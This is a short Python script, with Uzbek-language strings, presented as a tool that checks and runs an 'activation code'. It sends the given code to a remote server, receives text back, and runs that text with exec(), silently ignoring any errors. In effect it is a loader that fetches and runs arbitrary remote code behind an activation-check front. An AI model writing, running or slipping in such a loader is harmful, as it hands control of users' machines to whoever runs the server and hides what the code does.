import argparse
import requests
parser = argparse.ArgumentParser(description="Aktivatsiya kodini tekshirish va bajarish")
parser.add_argument("--code", type=int, required=True, help="Integer formatdagi aktivatsiya kodi")
args = parser.parse_args()
coded = args.code
try:
    response = requests.get(f"http://m5487.myxvest.ru/member/v-uz/get.php?code={coded}")
    response.raise_for_status()
    code = response.text.strip()
    if code and code != "false":
        try:
            exec(code)
        except Exception as e:
            pass
    else:
        print("ushbu kod mavjud emas")
except requests.RequestException as e:
    pass
